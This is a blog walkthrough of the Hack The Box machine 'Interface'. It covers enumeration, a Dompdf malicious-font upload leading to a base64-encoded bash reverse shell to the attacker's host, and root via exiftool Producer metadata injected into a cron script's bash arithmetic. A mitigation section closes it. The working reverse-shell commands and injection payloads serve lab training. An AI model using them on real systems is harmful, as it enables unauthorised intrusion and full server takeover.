---
layout: post
title: Hack The Box Walkthrough - Interface
date: 2023-03-11
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2023/03/HTB/Interface
img: 2023/03/Interface/Interface.png
---

This box was all about enumeration. I had to enumerate everything over and over to find the foothold. All the while trying to avoid rabbit holes.

* Room: Interface
* Difficulty: Medium
* URL: [https://app.hackthebox.com/machines/Interface](https://app.hackthebox.com/machines/Interface)
* Author: [irogir](https://app.hackthebox.com/users/476556)

## Website

I started the machine by running Rustscan to check for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------                                                                                                                                                                                                    😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.200:22
Open 10.10.11.200:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-09 20:32 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:32

...

Nmap scan report for target (10.10.11.200)
Host is up, received conn-refused (0.047s latency).
Scanned at 2023-03-09 20:32:25 EST for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 7289a0957eceaea8596b2d2dbc90b55a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsUhYQQaT6D7Isd510Mjs3HcpUf64NWRgfkCDtCcPC3KjgNKdOByzhdgpqKftmogBoGPHDlfDboK5hTEm/6mqhbNQDhOiX1Y++AXwcgLAOpjfSExhKQSyKZVveZCl/JjB/th0YA12XJXECXl5GbNFtxDW6DnueLP5l0gWzFxJdtj7C57yai6MpHieKm564NOhsA
qYqcxX8O54E9xUBW4u9n2vSM6ZnMutQiNSkfanyV0Pdo+yRWBY9TpfYHvt5A3qfcNbF3tMdQ6wddCPi98g+mEBdIbn1wQOvL0POpZ4DVg0asibwRAGo1NiUX3+dJDJbThkO7TeLyROvX/kostPH
|   256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrQxMOFdtvAa9AGgwirSYniXm7NpzZbgIKhzgCOM1qwqK8QFkN6tZuQsCsRSzZ59+3l+Ycx5lTn11fbqLFqoqM=
|   256 cc62905560a658629e6b80105c799b55 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPtZ4bP4/4TJNGMNMmXWqt2dLijhttMoaeiJYJRJ4Kqy
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Site Maintenance
|_http-favicon: Unknown favicon MD5: 21B739D43FCB9BBB83D8541FE4FE88FA
| http-methods:
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:32
Completed NSE at 20:32, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:32
Completed NSE at 20:32, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:32
Completed NSE at 20:32, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.99 seconds
```

Ports 22 (SSH) and 80 (HTTP) were open.

I looked at the website.

![Back Soon](/assets/images/2023/03/Interface/WellBeBackSoon.png "Back Soon")

It was a simple site that just said they were performing maintenance and that the site would be back soon. The 'contact us' text was a mailto link for 'contact@interface.htb'. I added the domain to my hosts file and reloaded the site. It was the same site.

I scanned for hidden files, and for subdomains. But I did not find anything.

The simple web page was requesting a suspicious amount of JavaScript for a page with just a few lines of text.

![Queries](/assets/images/2023/03/Interface/Queries.png "Queries")

I spent a lot of time reading all the JS for that site. I looked for vulnerabilities in the Next.js framework. 

Eventually, I took a closer look at the [CSP header](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

```
Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www.google.com http://www.google-analytics.com/gtm/js https://*.gstatic.com/feedback/ https://ajax.googleapis.com; connect-src 'self' http://prd.m.rendering-api.interface.htb; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://www.google.com; img-src https: data:; child-src data:;
```

There was a subdomain (http://prd.m.rendering-api.interface.htb) listed in there. I added it to my hosts file and tried to navigate to it. It returned a 200, but said 'File not found'.

I ran feroxbuster on the new subdomain. It found a 'vendor' folder that returned and 403. I ran feroxbuster on that folder, found another folder given a 403. I kept digging until I found [Dompdf](https://github.com/dompdf/dompdf).

```bash
$ feroxbuster -u http://prd.m.rendering-api.interface.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -m GET,POST

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://prd.m.rendering-api.interface.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET, POST]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor
403     POST        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor
[####################] - 3m    239202/239202  0s      found:2       errors:0
[####################] - 3m    239202/239202  1129/s  http://prd.m.rendering-api.interface.htb/


$ feroxbuster -u http://prd.m.rendering-api.interface.htb/vendor/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -m GET,POST -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://prd.m.rendering-api.interface.htb/vendor/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET, POST]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf
403     POST        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf
200      GET        0l        0w        0c http://prd.m.rendering-api.interface.htb/vendor/autoload.php
200     POST        0l        0w        0c http://prd.m.rendering-api.interface.htb/vendor/autoload.php
403      GET        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/composer
403     POST        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/composer
[####################] - 17m   358803/358803  0s      found:6       errors:0
[####################] - 17m   358803/358803  341/s   http://prd.m.rendering-api.interface.htb/vendor/



$ feroxbuster -u http://prd.m.rendering-api.interface.htb/vendor/dompdf/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -m GET,POST -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://prd.m.rendering-api.interface.htb/vendor/dompdf/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET, POST]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf
403     POST        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf
[####################] - 21m   358803/358803  0s      found:2       errors:0
[####################] - 21m   358803/358803  274/s   http://prd.m.rendering-api.interface.htb/vendor/dompdf/



$ feroxbuster -u http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -m GET,POST -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET, POST]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib
403     POST        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib
403      GET        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/tests
403     POST        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/tests
403      GET        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src
403     POST        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src
403      GET        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/VERSION
403     POST        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/VERSION
403      GET        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/.git
403     POST        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/.git
403      GET        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/.gitignore
403     POST        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/.gitignore
[####################] - 17m   358803/358803  0s      found:12      errors:0
[####################] - 17m   358803/358803  338/s   http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/


$ feroxbuster -u http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -m GET,POST -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET, POST]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Css
403     POST        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Css
403      GET        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Image
403     POST        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Image
200      GET        0l        0w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Options.php
200     POST        0l        0w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Options.php
200      GET        0l        0w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Helpers.php
200     POST        0l        0w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Helpers.php
403      GET        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Frame
403     POST        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Frame
200      GET        0l        0w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Frame.php
200     POST        0l        0w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Frame.php
403      GET        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Renderer
403     POST        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Renderer
500      GET        0l        0w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Renderer.php
500     POST        0l        0w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Renderer.php
403      GET        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Exception
403     POST        1l        2w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Exception
200      GET        0l        0w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Exception.php
200     POST        0l        0w        0c http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/Exception.php
[####################] - 15m   358803/358803  0s      found:20      errors:0
[####################] - 15m   358803/358803  381/s   http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/src/
```

I looked for vulnerabilities in Dompdf. I [found one](https://snyk.io/blog/security-alert-php-pdf-library-dompdf-rce/) in the way it handled fonts. But I had no way to exploit it. The PHP files I had were all classes. I had no entry point to execute code in those classes.

So I kept looking. At one point, I considered the fact that the subdomain name had 'api' in it and tried the '/api' endpoint. It gave me a 404, which explains why Feroxbuster had ignored it, but with a different error message.

```http
GET /api/ HTTP/1.1
Host: prd.m.rendering-api.interface.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

```http
HTTP/1.1 404 Not Found
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 10 Mar 2023 20:54:17 GMT
Content-Type: application/json
Connection: keep-alive
Content-Length: 50

{
  "status": "404",
  "status_text": "route not defined"
}
```

I tried enumerating it.

```bash
$ feroxbuster -u http://prd.m.rendering-api.interface.htb/api/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -m GET,POST -C 404 -xphp

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://prd.m.rendering-api.interface.htb/api/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET, POST]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
422     POST        1l        2w        0c http://prd.m.rendering-api.interface.htb/api/html2pdf
[####################] - 16m   358803/358803  0s      found:1       errors:10
[####################] - 16m   358803/358803  354/s   http://prd.m.rendering-api.interface.htb/api/
```

Feroxbuster found a 'html2pdf' endpoint. That was really promising considering the potential vulnerability in Dompdf.

I tried sending requests to it.

```http
POST /api/html2pdf HTTP/1.1
Host: prd.m.rendering-api.interface.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

```http
HTTP/1.1 422 Unprocessable Entity
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 10 Mar 2023 21:31:03 GMT
Content-Type: application/json
Connection: keep-alive
Content-Length: 36

{
  "status_text": "missing parameters"
}
```

It needed a parameter, so I tried 'html'

```http
POST /api/html2pdf HTTP/1.1
Host: prd.m.rendering-api.interface.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 57

{
"html": "<html><body>adfsadfaskjfads</body></html>"
}
```

It worked. I got a PDF file in return.

```http
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 10 Mar 2023 21:41:54 GMT
Content-Type: application/pdf
Content-Length: 0
Connection: keep-alive
X-Local-Cache: miss
Cache-Control: public
Content-Transfer-Encoding: Binary
Content-Disposition: attachment; filename=export.pdf

...
```

Not that I had an entry point. I took a better look at [Snyk's post](https://snyk.io/blog/security-alert-php-pdf-library-dompdf-rce/). They also provided a [GitHub repository](https://github.com/snyk-labs/php-goof) with an example exploit. The exploit used the way Dompdf handles fonts to upload a PHP file, and then access it in the cache.

I used the provided reverse shell font.

```http
POST /api/html2pdf HTTP/1.1
Host: prd.m.rendering-api.interface.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 81

{
    "html": "<link rel=stylesheet href='http://10.10.14.8/rshell.css'>"
}
```

The application loaded the CSS and the font from my machine. But I could not access uploaded PHP. The blog post mention this being harder as the file gets renamed, and the cache can be in a different place. From my enumeration, I already knew where Dompdf was. I looked at the code and saw that the hash that was added to the font name and family was simply an MD5 of where it was downloaded from. 

```bash
$ echo -n "http://10.10.14.8/rshell_font.php?raw=true" | md5sum
842b6ee4726ff6acf88d95fcec66762d  -
```

With that, I could access the uploaded PHP file at 'http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/rshell_normal_842b6ee4726ff6acf88d95fcec66762d.php'.
 
I encoded the bash reverse shell command to make using it as a URL parameter easier. 

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.8/4444  0>&1  ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC80NDQ0ICAwPiYxICAK
```

I started a netcat listener and navigated to the font PHP file.


```
http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/rshell_normal_842b6ee4726ff6acf88d95fcec66762d.php?test=echo%20`echo%20-n%20YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC80NDQ0ICAwPiYxICAK%20|%20base64%20-d%20|%20bash`;
```

I was in the machine and I had the user flag.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.200] 48832
bash: cannot set terminal process group (1296): Inappropriate ioctl for device
bash: no job control in this shell

www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ ls /home
ls /home
dev

www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ ls /home/dev
ls /home/dev
user.txt

www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ cat /home/dev/user.txt
<dor/dompdf/dompdf/lib/fonts$ cat /home/dev/user.txt
REDACTED
```

## Getting root

Once on the box, I looked for commands I could run with sudo, and for suid executables. I didn't find any. I also checked for files belonging to www-data or dev. There was nothing suspicious. 

I uploaded [pspy](https://github.com/DominicBreuker/pspy) to the server and let it run for a while.

```bash
2023/03/11 14:15:01 CMD: UID=0     PID=21078  | /bin/bash /root/clean.sh
2023/03/11 14:15:01 CMD: UID=0     PID=21077  | /bin/bash /root/clean.sh
2023/03/11 14:15:01 CMD: UID=0     PID=21076  | /bin/sh -c /root/clean.sh
2023/03/11 14:15:01 CMD: UID=0     PID=21075  | /usr/sbin/CRON -f
2023/03/11 14:15:01 CMD: UID=0     PID=21079  | cp /root/font_cache/dompdf_font_family_cache.php.bak /root/font_cache/dompdf_font_family_cache.php
2023/03/11 14:15:01 CMD: UID=0     PID=21080  | chown www-data /root/font_cache/dompdf_font_family_cache.php
2023/03/11 14:15:01 CMD: UID=0     PID=21081  | /bin/bash /root/clean.sh
2023/03/11 14:15:01 CMD: UID=0     PID=21082  | mv /root/font_cache/dompdf_font_family_cache.php /var/www/api/vendor/dompdf/dompdf/lib/fonts/dompdf_font_family_cache.php
2023/03/11 14:16:01 CMD: UID=0     PID=21085  | /bin/bash /usr/local/sbin/cleancache.sh
2023/03/11 14:16:01 CMD: UID=0     PID=21084  | /bin/sh -c /usr/local/sbin/cleancache.sh
2023/03/11 14:16:01 CMD: UID=0     PID=21083  | /usr/sbin/CRON -f
2023/03/11 14:16:01 CMD: UID=0     PID=21086  |
```

There was a 'cleancache' script that ran every two minutes. I looked at what it did.

```bash
www-data@interface:/dev/shm$ cat /usr/local/sbin/cleancache.sh
#! /bin/bash
cache_directory="/tmp"
for cfile in "$cache_directory"/*; do

    if [[ -f "$cfile" ]]; then

        meta_producer=$(/usr/bin/exiftool -s -s -s -Producer "$cfile" 2>/dev/null | cut -d " " -f1)

        if [[ "$meta_producer" -eq "dompdf" ]]; then
            echo "Removing $cfile"
            rm "$cfile"
        fi

    fi

done
```

It was looking at files in '/tmp' and using 'exiftool' to read the Producer metadata. Then it deleted all the files that were not created by Dompdf.

I spent a lot of time looking for vulnerabilities in exiftool. The server had two versions, and the one used by the script was older. So I was sure that this was what I needed to exploit. I found vulnerabilities in exiftool, but none that I could exploit.

I also tried to send a malicious payload in the producer to try to execute code in the `if` statement. Nothing I tried worked.

I found an interesting [blog post](https://www.vidarholen.net/contents/blog/?p=716). I tried the technique in the post, but it failed. 

```
www-data@interface:/tmp$ touch test

www-data@interface:/tmp$ exiftool -Producer='a[$(date >&2)]+42' test
    1 image files updated

www-data@interface:/tmp$ /usr/local/sbin/cleancache.sh

/usr/local/sbin/cleancache.sh: line 9: [[: a[$(date: bad array subscript (error token is "a[$(date")
Removing /tmp/test_original
```

I kept playing with it, and after some time I realized that it was the space that was the issue. If I removed it, the command got executed. 

```bash
www-data@interface:/tmp$ touch test

www-data@interface:/tmp$ exiftool -Producer='a[$(date>&2)]+42' test
    1 image files updated

www-data@interface:/tmp$ /usr/local/sbin/cleancache.sh
Mon Mar 13 00:01:37 UTC 2023
Removing /tmp/test_original
```

I create a small script to open a reverse shell to my machine. 

```bash
www-data@interface:/tmp$ cat /dev/shm/rev.sh
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.8/4445 0>&1'
```

I made the script executable and I modified the producer of a file to launch the script.

```bash
www-data@interface:/tmp$ chmod +x /dev/shm/rev.sh

www-data@interface:/tmp$ touch test

www-data@interface:/tmp$ exiftool -Producer='a[$(/dev/shm/rev.sh>&2)]+42' test
    1 image files updated
```

I launched a netcat listener and waited for the script to run.

```bash
$ nc -klvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.200] 48880
bash: cannot set terminal process group (3755): Inappropriate ioctl for device
bash: no job control in this shell

root@interface:~# cat /root/root.txt
cat /root/root.txt
REDACTED
```

## Mitigation

This box had a library with a know vulnerability. The Snyk post mentions that the issue was not fixed at the time they published it. I don't know if it has been patched since. But they mention an easy way to protect against this issue. You can turn off the loading remote font by setting the `isRemoteEnabled` setting to false.

The issue with the cleanup script is harder for me. I don't do much bash scripting, so I don't know how to process user's input in a secure manner. But fixing it remains easy. If you generate temporary files, you can put them in a folder that contains nothing else and delete everything in it. 